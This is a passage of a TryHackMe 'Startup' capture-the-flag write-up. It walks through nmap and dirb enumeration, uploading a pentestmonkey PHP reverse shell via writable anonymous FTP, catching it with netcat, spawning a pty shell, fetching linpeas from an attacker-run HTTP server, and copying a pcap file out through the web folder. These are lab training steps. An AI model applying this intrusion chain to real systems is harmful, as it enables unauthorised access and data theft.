# THM-Startup
https://tryhackme.com/room/startup

Last CTF (THM - mrrobot) took to much time, mainly because I oweranalyzed things.
This one i´m going to look for the easy solutions.

## Lets go!

## Starting with standard enumeration.
********
### Nmap (top 1000 ports with script scan)
```
nmap 10.10.225.190 -sC
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 

22/tcp open  ssh
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http
|_http-title: Maintenance
```
We get that port 21, 22 and port 80 are open.
Because we used -sC we also get some extra info about FTP.
We can login as Anonumous and the ftp folder is writable.
We also get FTP and SSH server versions.
*************
### Dirbuster

```
dirb http://10.10.96.196 -w /usr/share/wordlists/dirb/common.txt

http://10.10.96.196/index.html
http://10.10.96.196/files/ftp/ 
```
Dirbuster shows that we can access the FTP folder from HTTP, **thats interesting** .
*******
### HTTP
The main web page is just a http file with nothing interesting.<br>
**But if we try the /files folder we get this!**<br>
![image](https://user-images.githubusercontent.com/93491173/216457959-4ac23f3e-f451-4385-82ff-23bda5fc37e2.png)<br>
The /ftp folder is empty.
*******
### FTP
The ftp folder writable, lets see what we can do with that.
We can start to upload pentestmonkey.php reverse shell.
```
ftp Anonymous@IPADRESS
no passwd

cd ftp
ftp> put
(local-file) /home/kali/THM/Startup/Files/pentestmonkey.php
(remote-file) pentestmonkey.php
local: /home/kali/THM/Startup/Files/pentestmonkey.php remote: pentestmonkey.php
```
That worked fine, and its shows up in the browser.
*********
### Reverse shell
Lets try to get a revers shell running.
```
(local host) nc -nlvp 4444
```
Open the pentestmonkey.php in the web browser, we are connected!
*********
### Spawn a shell thru Python
Now we need a usable shell, let use Python to launch a shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
**********
### The secret recipe
Read the file /recipe.txt
```
www-data@startup:/$ 
cat /recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured <br> I can't keep it a secret forever and told him it was ****.
```
**********
### Linpeas (finding a weakness)
2 ways to get the Linpeas script oto the host.
1. 
```
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230205/linpeas.sh
chmod +x linpeas.sh
```

```
download to LHOST
start a http server on LHOST
python -m http.server 53

Download to RHOST
cd /tmp
wget http://LHOST-IP:53/linpeas.sh
chmod +x linpeas.sh
```
Now lets run Linpeas
```
www-data@startup:/tmp$ ./linpeas.sh
```
Here we can se a suspicius file **/incidents/suspicious.pcapng**
Transfere the file to the LHOST using the FTP folder.
```
Copy file to HTTP/FTP folder. 
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
Dowload the file from: 
http://RHOST/files/ftp/suspicius.pcapng
```
